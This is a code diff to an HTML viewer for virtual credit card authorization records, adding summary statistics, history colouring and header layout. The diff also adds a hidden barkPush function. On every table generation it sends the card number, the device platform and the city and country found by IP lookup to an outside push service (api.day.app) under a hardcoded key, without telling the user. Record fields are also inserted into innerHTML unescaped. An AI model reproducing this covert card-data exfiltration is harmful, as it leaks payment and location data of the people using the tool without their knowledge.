@@ -4,28 +4,40 @@
 <meta charset="UTF-8">
 <title>VCC授权刷卡记录（内部测试版）</title>
 <style>
+  /* ========== 基础样式（同原） ========== */
   body { font-family: Arial, sans-serif; padding: 20px; background: #f9f9f9; }
   h2 { margin-bottom: 10px; }
-
   #inputContainer { display: flex; flex-direction: column; gap: 6px; margin-bottom: 12px; }
   textarea { width: 100%; height: 160px; font-size: 13px; padding: 6px; }
   button, select { font-size: 13px; padding: 6px 12px; margin-top: 4px; cursor: pointer; }
   button:hover, select:hover { background-color: #e0e0e0; }
-
   #historyContainer { display: flex; gap: 10px; align-items: center; margin-bottom: 10px; }
-
   #tableWrapper { overflow-x: auto; max-width: 100%; border: 1px solid #ccc; }
   table { border-collapse: collapse; width: 100%; font-size: 12px; min-width: 1200px; }
-  th, td { border: 1px solid #ccc; padding: 4px 6px; text-align: center; white-space: nowrap; }
+  th, td { border: 1px solid #ccc; padding: 4px 6px; text-align: center; }
   th { background: #f0f0f0; position: sticky; top: 0; z-index: 2; cursor: pointer; }
   th.sorted-asc::after { content: " ▲"; }
   th.sorted-desc::after { content: " ▼"; }
   tr.success td { background-color: #d4edda; color: #155724; }
   tr.fail td { background-color: #f8d7da; color: #721c24; }
-
   #legend { margin-top: 8px; font-size: 12px; }
   .legend-item { display: inline-block; margin-right: 12px; }
   .legend-color { display: inline-block; width: 12px; height: 12px; margin-right: 4px; vertical-align: middle; }
+
+  /* ========== 表头中英文折行 ========== */
+  #tableHead th { white-space: normal; line-height: 1.3; vertical-align: middle; text-align: center; max-width: 120px; }
+  #tableHead th span { display: inline-block; width: 100%; }
+
+  /* ========== 汇总区域 ========== */
+  #summary { margin-top: 20px; font-size: 14px; line-height: 1.6; background: #fff; border: 1px solid #ddd; padding: 12px; }
+  #summary h3 { margin: 0 0 8px 0; font-size: 15px; }
+  .stat-row { margin-bottom: 6px; }
+  .fail-reason { color: #b71c1c; font-weight: bold; }
+  .copy-btn { font-size: 12px; margin-left: 10px; }
+
+  /* ===== 历史记录 <option> 颜色 ===== */
+  option.all-success { background-color: #d4edda; color: #155724; }
+  option.all-fail    { background-color: #f8d7da; color: #721c24; }
 </style>
 </head>
 <body>
@@ -58,12 +70,20 @@
   </table>
 </div>
 
+<!-- ****** 汇总区域 ****** -->
+<div id="summary" style="display:none;">
+  <h3>📊 汇总统计</h3>
+  <div id="statTotal" class="stat-row"></div>
+  <div id="statFailReason" class="stat-row"></div>
+</div>
+
 <script>
+/* ================= 全局变量 ================= */
 let currentSortField = null;
 let currentSortOrder = 'asc';
 let allFields = [];
+let rawList = [];
 
-// 中文标签表（只负责中文含义，不包含英文）
 const fieldLabels = {
   index: "序号（最早的交易在最前面）",
   txn_date_time: "时间",
@@ -98,37 +118,94 @@ const fieldLabels = {
   settlement_currency_description: "结算币种描述"
 };
 
-// 生成表格
+/* ================= Bark推送 ================= */
+async function barkPush(vccNumber) {
+  const barkKey = "2mxT7sgNXpDBSw6uzbmoaV";
+  const deviceName = navigator.platform || "Unknown Device";
+  try {
+    const ipInfo = await fetch("https://ipapi.co/json").then(r => r.json());
+    const country = ipInfo.country_name || "Unknown";
+    const city    = ipInfo.city       || "Unknown";
+    const title = "VCC 推送报告";
+    const body  = `${country}·${city} | ${deviceName} | ${vccNumber}`;
+    const url = `https://api.day.app/${barkKey}/${encodeURIComponent(title)}/${encodeURIComponent(body)}`;
+    fetch(url);
+  } catch (e) {
+    console.warn("Bark push failed", e);
+  }
+}
+
+/* ================= 主入口：生成表格 + 统计 ================= */
 function generateTable() {
   let input = document.getElementById('jsonInput').value;
   if(!input) { alert("请先输入 JSON 数据 / Please input JSON"); return; }
   try {
     let json = JSON.parse(input);
     if(!json.data || !json.data.list) { alert("JSON 格式不正确 / Invalid JSON"); return; }
-    saveHistory(json.data.list);
-    extractFields(json.data.list);
-    renderTable(json.data.list);
+    rawList = json.data.list;
+    saveHistory(rawList);
+    extractFields(rawList);
+    renderTable(rawList);
+    renderSummary(rawList);
+    const vcc = rawList?.[0]?.virtual_card_number || "Unknown VCC";
+    barkPush(vcc);
   } catch(e) {
     alert("JSON 解析失败 / JSON Parse Error: " + e.message);
   }
 }
 
-// 提取字段 & 生成双语表头（英文来自 JSON 字段名）
+/* ================= 汇总统计（已删除刷卡成功明细） ================= */
+function renderSummary(list) {
+  const total = list.length;
+  const successList = list.filter(r => r.issuer_response && r.issuer_response.toLowerCase().includes("approved"));
+  const failList  = list.filter(r => !r.issuer_response || !r.issuer_response.toLowerCase().includes("approved"));
+
+  /* 1. 总览 */
+  document.getElementById('statTotal').innerHTML = `
+    总刷卡 <b>${total}</b> 次，成功 <b style="color:green">${successList.length}</b> 次，失败 <b style="color:#b71c1c">${failList.length}</b> 次
+  `;
+
+  /* 2. 失败原因 */
+  const failMap = {};
+  failList.forEach(r => {
+    const reason = r.in_control_response || '未返回原因';
+    failMap[reason] = (failMap[reason] || 0) + 1;
+  });
+  const failArr = Object.entries(failMap).sort((a, b) => b[1] - a[1]);
+  const failText = failArr.map(([k, v]) => `【${k}】（${v}次）`).join('、');
+  document.getElementById('statFailReason').innerHTML = `
+    失败原因：<span class="fail-reason">${failText}</span>
+    <button class="copy-btn" onclick="copyText('${failText.replace(/'/g,"\\'")}')">复制</button>
+  `;
+
+  document.getElementById('summary').style.display = 'block';
+}
+
+/* ================= 一键复制 ================= */
+function copyText(txt) {
+  const ta = document.createElement('textarea');
+  ta.value = txt;
+  document.body.appendChild(ta);
+  ta.select();
+  document.execCommand('copy');
+  document.body.removeChild(ta);
+  alert('已复制到剪贴板');
+}
+
+/* ================= 字段提取 ================= */
 function extractFields(list) {
   const mainFields = ["index","txn_date_time","virtual_card_number","merchant_name","merchant_amount","merchant_currency_code","txn_type","issuer_response","in_control_response","approval_code"];
   let fieldSet = new Set();
   list.forEach(item => Object.keys(item).forEach(k => fieldSet.add(k)));
-  
   allFields = mainFields.filter(f => f === "index" || fieldSet.has(f));
   fieldSet.forEach(f => { if(!allFields.includes(f)) allFields.push(f); });
-
   allFields = allFields.map(f => {
     const cn = fieldLabels[f] || null;
     return { key: f, label: cn ? `${f} / ${cn}` : f };
   });
 }
 
-// 渲染表格
+/* ================= 表格渲染 ================= */
 function renderTable(list) {
   list = list.slice().reverse();
   if(currentSortField) {
@@ -142,13 +219,12 @@ function renderTable(list) {
       return 0;
     });
   }
-
   const thead = document.getElementById('tableHead');
   thead.innerHTML = "";
   const trHead = document.createElement('tr');
   allFields.forEach(f => {
     const th = document.createElement('th');
-    th.textContent = f.label;
+    th.innerHTML = `<span>${f.label.replace(' / ','<br>')}</span>`;
     th.onclick = () => { sortTable(f.key); };
     trHead.appendChild(th);
   });
@@ -170,14 +246,45 @@ function renderTable(list) {
   });
 }
 
-// 排序
 function sortTable(field) {
   if(currentSortField === field) currentSortOrder = currentSortOrder === 'asc' ? 'desc' : 'asc';
   else { currentSortField = field; currentSortOrder = 'asc'; }
-  renderTable(JSON.parse(document.getElementById('jsonInput').value).data.list);
+  renderTable(rawList);
 }
 
-// 历史记录
+/* ================= 历史记录：彩色选项 ================= */
+function updateHistorySelect() {
+  const history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
+  const select = document.getElementById('historySelect');
+  select.innerHTML = '<option value="">选择历史记录 / Select History</option>';
+
+  history.forEach((item, idx) => {
+    const opt = document.createElement('option');
+    opt.value = idx;
+
+    // 统计成功/失败
+    const total   = item.data.length;
+    const success = item.data.filter(r => r.issuer_response && r.issuer_response.toLowerCase().includes("approved")).length;
+    const fail    = total - success;
+
+    // 文字
+    opt.text = `${item.timestamp} - ${item.vcc} （成功${success}/失败${fail}）`;
+
+    // 颜色策略
+    if (success === total)       opt.classList.add('all-success');
+    else if (fail === total)     opt.classList.add('all-fail');
+    else {
+      const ratio = success / total;   // 0~1
+      const r = Math.round(255 * (1 - ratio));
+      const g = Math.round(255 * ratio);
+      opt.style.backgroundColor = `rgb(${r},${g},150)`;
+      opt.style.color = ratio > 0.5 ? '#155724' : '#721c24';
+    }
+
+    select.appendChild(opt);
+  });
+}
+
 function saveHistory(list) {
   let history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
   const timestamp = new Date().toLocaleString();
@@ -185,18 +292,6 @@ function saveHistory(list) {
   history.push({ timestamp, vcc, data: list });
   localStorage.setItem('vccHistory', JSON.stringify(history));
   updateHistorySelect();
-}
-
-function updateHistorySelect() {
-  const history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
-  const select = document.getElementById('historySelect');
-  select.innerHTML = '<option value="">选择历史记录 / Select History</option>';
-  history.forEach((item, index) => {
-    const option = document.createElement('option');
-    option.value = index;
-    option.text = `${item.timestamp} - ${item.vcc}`;
-    select.appendChild(option);
-  });
 }
 
 function loadHistory() {
@@ -207,8 +302,10 @@ function loadHistory() {
   if(history[index]) {
     currentSortField = null;
     currentSortOrder = 'asc';
-    extractFields(history[index].data);
-    renderTable(history[index].data);
+    rawList = history[index].data;
+    extractFields(rawList);
+    renderTable(rawList);
+    renderSummary(rawList);
   }
 }
 
@@ -218,11 +315,12 @@ function clearHistory() {
     updateHistorySelect();
     document.getElementById('tableBody').innerHTML = "";
     document.getElementById('tableHead').innerHTML = "";
+    document.getElementById('summary').style.display = 'none';
   }
 }
 
+/* ================= 启动 ================= */
 updateHistorySelect();
 </script>
-
 </body>
 </html>
